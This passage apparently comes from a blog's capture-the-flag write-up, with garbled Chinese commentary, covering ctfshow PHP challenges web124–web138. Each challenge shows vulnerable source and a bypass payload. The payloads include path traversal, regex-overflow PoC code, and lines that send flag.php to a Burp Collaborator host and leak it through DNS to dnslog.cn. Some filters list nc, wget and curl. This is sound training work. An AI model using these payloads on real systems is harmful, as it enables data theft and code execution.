eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¯»æ‡‚é¢˜æ„å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨ä¼ å‚æ—¶ä¼ å…¥ä¸€ä¸ªéæ³•çš„ä»–ä¼šå°†ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬æ¢ä¸º_ä¸”å€¼è½¬æ¢ä¸€æ¬¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</span><br></pre></td></tr></table></figure><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);</span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¥½å¤šå‡½æ•°</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1=flag.php</span><br><span class="line">[post data]</span><br><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract(&#x27;$_POST&#x27;)&amp;fl0g=flag_give_me</span><br></pre></td></tr></table></figure><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿‡æ»¤çš„å¤ªéš¾å—äº†</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><br><span class="line">function waf($url)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;, $url))&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(waf($url))&#123;</span><br><span class="line">    die(&quot;å—¯å“¼ï¼Ÿ&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($ctf_show===&#x27;ilove36d&#x27;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å˜é‡è¦†ç›–çš„é¢˜ç›®ï¼Œéš¾ç‚¹æ˜¯_è¢«è¿‡æ»¤äº†ï¼Œæ‰¾ä¸€ä¸ªéæ³•çš„å­—ç¬¦ç„¶åèƒ½å¤Ÿä½¿å…¶è½¬æ¢ä¸º_ï¼Œå‘ç°ç©ºæ ¼å¯ä»¥ã€‚</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf show=ilove36d</span><br></pre></td></tr></table></figure><h2 id="web128"><a href="#web128" class="headerlink" title="web128( _())"></a>web128( _())</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$f1 = $_GET[&#x27;f1&#x27;];</span><br><span class="line">$f2 = $_GET[&#x27;f2&#x27;];</span><br><span class="line"></span><br><span class="line">if(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;å—¯å“¼ï¼Ÿ&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸€ç‚¹çƒ­çŸ¥è¯†</p><blockquote><p> _()æ˜¯ä¸€ä¸ªå‡½æ•°</p><p>_()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll</p><p>get_defined_vars()å‡½æ•°</p><p>get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</p></blockquote><p>payload: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure><h2 id="web129-å¤šé‡ç›®å½•"><a href="#web129-å¤šé‡ç›®å½•" class="headerlink" title="web129(å¤šé‡ç›®å½•)"></a>web129(å¤šé‡ç›®å½•)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">=error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = $_GET[&#x27;f&#x27;];</span><br><span class="line">    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;</span><br><span class="line">        echo readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ å¤šé‡ç›®å½•ï¼Œè¿”å›ä¸€ä¸ªä¸å­˜åœ¨æ»´ç›®å½•ï¼Œç„¶åæ…¢æ…¢æ„é€ </p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctfshow/../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../ctfshow/../html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><blockquote><p>very very veryï¼ˆçœç•¥25ä¸‡ä¸ªveryï¼‰ctfshow</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = $_POST[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ­£åˆ™ä¸çŸ¥é“æƒ³å¹²å•¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure><h2 id="web131-æ­£åˆ™æº¢å‡º"><a href="#web131-æ­£åˆ™æº¢å‡º" class="headerlink" title="web131(æ­£åˆ™æº¢å‡º)"></a>web131(æ­£åˆ™æº¢å‡º)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = (String)$_POST[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­£åˆ™æº¢å‡ºï¼Œæ¶¨çŸ¥è¯†äº†</p><p><a href="https://www.laruence.com/2010/06/08/1579.html">æ·±æ‚‰æ­£åˆ™(pcre)æœ€å¤§å›æº¯/é€’å½’é™åˆ¶ - é£é›ªä¹‹éš… (laruence.com)</a></p><p>å†™ä¸€ä¸ªå¾ˆç®€å•çš„poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">very=&#x27;very&#x27;*250000+&#x27;36Dctfshow&#x27;</span><br><span class="line">data=&#123;&#x27;f&#x27;:very&#125;</span><br><span class="line">url=&#x27;http://6dd31482-e895-424c-8c64-8a12edaefb5f.challenge.ctf.show/&#x27;</span><br><span class="line"></span><br><span class="line">pos=requests.post(url=url,data=data)</span><br><span class="line">print(pos.text)</span><br></pre></td></tr></table></figure><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $username = (String)$_GET[&#x27;username&#x27;];</span><br><span class="line">    $password = (String)$_GET[&#x27;password&#x27;];</span><br><span class="line">    $code = (String)$_GET[&#x27;code&#x27;];</span><br><span class="line"></span><br><span class="line">    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;</span><br><span class="line">        </span><br><span class="line">        if($code == &#x27;admin&#x27;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‚¯å®šè¦ç»™æºç è¯•äº†<a href="http://www.zip/">www.zip</a>    è¯•äº†.gitï¼Œå‘ç°robots.txtæœ‰å†…å®¹ï¼Œè®¿é—®/adminï¼Œå‘ç°æºç </p><p>ä¸»è¦æ˜¯é€»è¾‘ç¬¬ä¸€ä¸ª&amp;&amp;è¿”å›falseï¼Œç„¶å||è¿”å›ä¸€ä¸ªtrueå³å¯æ‰§è¡Œ</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=admin&amp;password=admin&amp;code=admin</span><br></pre></td></tr></table></figure><h2 id="web133-Burp-Collaboratorå®¢æˆ·ç«¯-ç±»ä¼¼äºDNSlogå¹³å°"><a href="#web133-Burp-Collaboratorå®¢æˆ·ç«¯-ç±»ä¼¼äºDNSlogå¹³å°" class="headerlink" title="web133(Burp Collaboratorå®¢æˆ·ç«¯(ç±»ä¼¼äºDNSlogå¹³å°))"></a>web133(Burp Collaboratorå®¢æˆ·ç«¯(ç±»ä¼¼äºDNSlogå¹³å°))</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag.php</span><br><span class="line">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class="line">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;</span><br><span class="line">        eval(substr($F,0,6));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…­ä¸ªæ•°ç›´æ¥æ— äº†ï¼Œæ€è€ƒäº†å¥½ä¹…æ²¡å•¥æ€è·¯ï¼Œä¸»è¦æ˜¯æ²¡å›æ˜¾ï¼Œå¾ˆéš¾å—ï¼ŒçŸ¥é“ç”¨dnslogï¼Œä½†å¥ˆä½•å¤ªèœï¼Œå¹¶æ²¡æœ‰æ€ä¹ˆç”¨è¿‡ï¼Œçœ‹äº†hint</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/aa518e820b954dd59b7ef708fab1464f.png" alt="img" style="zoom:67%;" /><p>å­¦ä¹ äº†bpçš„æ–°æ¨¡å—ï¼Œå­¦åˆ°äº†</p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class="line">    die(&quot;nonononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class="line">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªé¢˜è¿˜æ˜¯æ¨èåœ¨æœ¬åœ°å¤ç°ï¼Œå®¹æ˜“å‘ç°ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜</p><p>æ­¤é¢˜éš¾ç‚¹åœ¨äºä¸èƒ½é€šè¿‡æ­£å¸¸çš„getå’Œpostæ–¹æ³•ä¼ å‚ï¼Œä½†æ˜¯parse_str($_SERVER[â€˜QUERY_STRINGâ€™]);</p><p>ç»™äº†æœºä¼šï¼Œå¼ºè¡Œå°†_postçœ‹ä½œä¸€ä¸ªå‚æ•°</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag.php</span><br><span class="line">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class="line">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;</span><br><span class="line">        eval(substr($F,0,6));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘è¶…è¿‡æ»¤è¿™ä¹ˆå¤šï¼ï¼ï¼ curlåˆ«è¿‡æ»¤äº†ï¼Œä½†æ˜¯pingå¯ä»¥ç”¨</p><p>è¿˜æœ‰ä¸€ä¸ªå‘ï¼Œåœ¨pingä¹‹åå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œæœ€ååšäº†ç­›é€‰æ‰æˆåŠŸæ‹¿åˆ°</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F=`$F`;+ping `nl flag.php|awk &#x27;NR==16&#x27;| tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wau0cy.dnslog.cn</span><br></pre></td></tr></table></figure><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function check($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å›æ˜¾æ‰€ä»¥å¯¹è¾“å‡ºå†…å®¹è½¬å­˜</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /|tee 1</span><br></pre></td></tr></table></figure><h2 id="web137-call-user-fuc"><a href="#web137-call-user-fuc" class="headerlink" title="web137(call_user_fuc)"></a>web137(call_user_fuc)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿcall_user_fucçš„åˆ©ç”¨</p><p><a href="https://www.php.net/manual/zh/function.call-user-func.php">https://www.php.net/manual/zh/function.call-user-func.php</a></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[post data]</span><br><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;</span><br><span class="line">    die(&quot;private function&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br><span 